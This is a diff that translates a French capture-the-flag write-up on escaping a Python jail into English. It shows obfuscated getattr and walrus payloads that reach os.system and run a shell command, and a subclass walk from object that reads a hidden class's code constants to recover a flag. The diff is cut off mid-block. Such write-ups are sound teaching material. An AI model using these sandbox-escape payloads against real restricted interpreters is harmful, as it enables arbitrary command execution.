@@ -46,7 +46,7 @@ Error: ValueError
 Error: ValueError
 ```
 
-We might want to investigate, I downloaded a list of common fucntions in Python and the list of all Python Keywords and ran a try-error .py script working with websockets.
+We might want to investigate, I downloaded a list of common functions in Python and the list of all Python Keywords and ran a try-error .py script working with websockets.
 ```python
 import socket
 
@@ -170,22 +170,22 @@ Error: AttributeError
 ```
 etc.
 
-On va alors utiliser une syntaxe := : 
-### 🧠 Que fait := ?
+We'll then use the := syntax:
+### 🧠 What does := do?
 
-Il assigne une valeur à une variable en même temps qu’on l’utilise dans une expression.
+It assigns a value to a variable at the same time as it's used in an expression.
 
-C’est un mélange entre :
-- une affectation (=), et
-- une utilisation inline dans une expression.
+It's a cross between :
+- an assignment (=), and
+- inline use in an expression.
 
-🔍 Exemple simple :
+🔍 Simple example:
 ```bash
 if (n := len([1, 2, 3])) > 2:
     print(f"Liste de longueur {n}")
 ```
 
-Après concaténationdes chaines:
+After string concatenation:
 ```bash
 >>> [b:=getattr(print,"_"*2+"sel"+"f"+"_"*2),i:=getattr(b,"_"*2+"imp"+"ort"+"_"*2),o:=i("o"+"s"),s:=getattr(o,"sy"+"stem"),s("ls -a")]
 .
@@ -211,28 +211,28 @@ FLAG = "BDSEC{w3lCom3_TO_PyJail}"
 [..., <class '__main__.Access'>, ...] 
 ```
 
-### 🧠 Qu'est ce que  <class 'object'> ?
+### 🧠 What is <class ‘object’>?
 
-C’est la classe de base universelle dont toutes les classes héritent, sauf exception très particulière.
+It's the universal base class from which all classes inherit, barring very specific exceptions.
 
-Autrement dit :
+In other words:
 ```python
-class MaClasse:
+class MyClass:
     pass
 
-print(issubclass(MaClasse, object))  # True
+print(issubclass(MyClass, object))  # True
 
-class MaClasse: pass
-# équivaut à
-class MaClasse(object): pass
+class MyClass: pass
+# is equivalent to
+class MyClass(object): pass
 ```
 
-A l'aide de getattr, on peut remonter à `object`, on remonte l'aborescence des classes pour sortir du contexte de la classe actuelle:
+Using getattr, you can go back to `object`, going up the aborescence of classes to get out of the context of the current class:
 ```python
 >>> getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0]
 <class 'object'>
 ```
-Et on peut utiliser `object.__subclasses__()` pour afficher l'ensemble des classes:
+And you can use `object.__subclasses__()` to display all classes:
 ```python
 >>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()
 [<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, ...]
@@ -240,19 +240,19 @@ Et on peut utiliser `object.__subclasses__()` pour afficher l'ensemble des class
 >>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219]
 <class '__main__.Access'>
 ```
-Un fois qu'on a accès à la classe qui nous intéresse, on va explorer cette classe:
+Once we have access to the class we're interested in, we'll explore it:
 
-### 🧠 Qu’est-ce que CLASS.__dict__ ?
+### 🧠 What is CLASS.__dict__?
 
-Pour une classe `CLASS`, `CLASS.__dict__` est un dictionnaire Python qui contient les attributs et méthodes définis directement dans cette classe (pas ceux hérités).
+For a `CLASS` class, `CLASS.__dict__` is a Python dictionary containing the attributes and methods defined directly in that class (not inherited ones).
 
-On peut y accéder ainsi:
+It can be accessed as follows:
 ```python
 >>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219], "_""_dict_""_")
 mappingproxy({'__module__': '__main__', '__firstlineno__': 21, '__slots__': (), 'reveal': <function Access.reveal at 0x7e658ecbb880>, '__static_attributes__': (), '__doc__': None})
 ```
 
-On peut alors accéder à toute fonction définie dans cette classe, explorer les constantes définies dans celle-ci..
+You can then access any function defined in this class, and explore the constants defined in it...
 ```python
 >>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal
 <function Access.reveal at 0x107b49d00>
@@ -264,11 +264,11 @@ On peut alors accéder à toute fonction définie dans cette classe, explorer le
 <code object reveal at 0x7e658edf4c60, file "/home/noman/./pyJail.py", line 23>
 ```
 
-### 🧠 Qu’est-ce que co_consts, co_names et co_code dans un objet code Python ?
+### 🧠 What are co_consts, co_names and co_code in a Python code object?
 
-- `co_code` : le bytecode (instructions en bytes) que Python exécute.
-- `co_consts` : un tuple des constantes utilisées dans le code (nombres, chaînes, fonctions imbriquées).
-- `co_names` : un tuple des noms (variables, fonctions, attributs) référencés par le bytecode.
+- `co_code` : the bytecode (instructions in bytes) that Python executes.
+- `co_consts` : a tuple of constants used in the code (numbers, strings, nested functions).
+- `co_names` : a tuple of names (variables, functions, attributes) referenced by the bytecode.
 
 ```python
 >>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_").co_consts
